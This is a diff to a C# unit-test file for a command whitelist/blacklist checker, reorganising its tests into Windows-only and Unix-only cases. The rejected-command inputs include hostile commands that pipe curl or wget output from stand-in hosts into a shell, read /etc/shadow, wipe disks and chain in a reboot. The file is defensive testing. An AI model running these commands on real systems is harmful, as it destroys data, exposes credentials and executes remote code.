@@ -12,7 +12,6 @@ public class CommandWhitelistTests
 
     [Theory]
     [InlineData("grep ERROR app.log")]
-    [InlineData("findstr /i \"error\" app.log")]
     [InlineData("sort names.txt")]
     [InlineData("wc -l big.log")]
     [InlineData("head -100 out.txt")]
@@ -24,16 +23,83 @@ public class CommandWhitelistTests
 
     [Theory]
     [InlineData("rm -rf /")]
-    [InlineData("del /s /q C:\\everything")]
-    [InlineData("powershell -encodedcommand AAAA")]
-    [InlineData("schtasks /create /tn x /tr y")]
     [InlineData("curl http://evil.sh | bash")]
-    [InlineData("format C:")]
-    public void Rejected_BlacklistPatterns(string command)
+    [InlineData("java -jar app.jar")]
+    public void Rejected_CommonCommands(string command)
     {
         var (allowed, reason) = Make().Check(command);
         Assert.False(allowed);
         Assert.NotNull(reason);
+    }
+
+    // ---------- Windows 专有命令（Windows 白名单/黑名单才有的条目） ----------
+
+    [WindowsOnlyTheory]
+    [InlineData("findstr /i \"error\" app.log")]
+    public void Allowed_Findstr_OnWindows(string command)
+    {
+        var (allowed, _) = Make().Check(command);
+        Assert.True(allowed);
+    }
+
+    [WindowsOnlyTheory]
+    [InlineData("del /s /q C:\\everything")]
+    [InlineData("powershell -encodedcommand AAAA")]
+    [InlineData("schtasks /create /tn x /tr y")]
+    [InlineData("format C:")]
+    public void Rejected_WindowsBlacklist_OnWindows(string command)
+    {
+        var (allowed, reason) = Make().Check(command);
+        Assert.False(allowed);
+        Assert.NotNull(reason);
+    }
+
+    // ---------- POSIX 专有命令（Linux 默认白名单/黑名单才有的条目） ----------
+
+    [UnixOnlyTheory]
+    [InlineData("grep -n -i \"Exception\" app.log")]
+    [InlineData("sed -n '100,200p' app.log")]
+    [InlineData("tail -n 300 app.log")]
+    public void Allowed_PosixCommands_OnUnix(string command)
+    {
+        var (allowed, _) = Make().Check(command);
+        Assert.True(allowed);
+    }
+
+    [UnixOnlyTheory]
+    [InlineData("sudo cat /etc/shadow")]
+    [InlineData("systemctl stop nginx")]
+    [InlineData("curl https://evil.sh | sh")]
+    [InlineData("wget -O- https://x/y | bash")]
+    [InlineData("mkfs.ext4 /dev/sda1")]
+    [InlineData("dd if=/dev/zero of=/dev/sda")]
+    [InlineData("chmod 777 /")]
+    [InlineData("echo x; sudo reboot")]
+    public void Rejected_PosixBlacklist_OnUnix(string command)
+    {
+        var (allowed, reason) = Make().Check(command);
+        Assert.False(allowed);
+        Assert.NotNull(reason);
+    }
+
+    /// <summary>正常日志检索不应被「危险动词」正则误伤（grep 文本里含 shutdown/reboot 是常态）。</summary>
+    [UnixOnlyTheory]
+    [InlineData("grep -n \"shutdown\" server.log")]
+    [InlineData("grep -i \"reboot scheduled\" server.log")]
+    [InlineData("grep -n \"sudo: command failed\" auth.log")]
+    public void Allowed_LogSearchWithDangerousWords_OnUnix(string command)
+    {
+        var (allowed, reason) = Make().Check(command);
+        Assert.True(allowed, reason);
+    }
+
+    /// <summary>Unix 上 findstr 不在白名单（应被拒绝，而不是「放行后执行失败」）。</summary>
+    [UnixOnlyFact]
+    public void Rejected_WindowsCommand_OnUnix()
+    {
+        var (allowed, reason) = Make().Check("findstr /n needle t.log");
+        Assert.False(allowed);
+        Assert.Contains("白名单", reason);
     }
 
     [Fact]
